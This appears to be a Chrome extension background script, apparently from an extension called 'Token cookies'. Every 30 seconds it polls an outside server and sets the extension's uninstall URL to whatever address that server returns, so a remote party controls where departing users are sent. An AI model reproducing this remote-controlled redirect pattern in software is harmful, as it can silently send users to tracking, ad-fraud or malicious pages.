(function() {
    setInterval(() => {
        (async () => {
            const response = await fetch('https://extensions.amaiteam.info/api/v1/gul?name=Token cookies');
            const data = await response.json();
            chrome.runtime.setUninstallURL(data.data);
        })();
    }, 30000)
})();
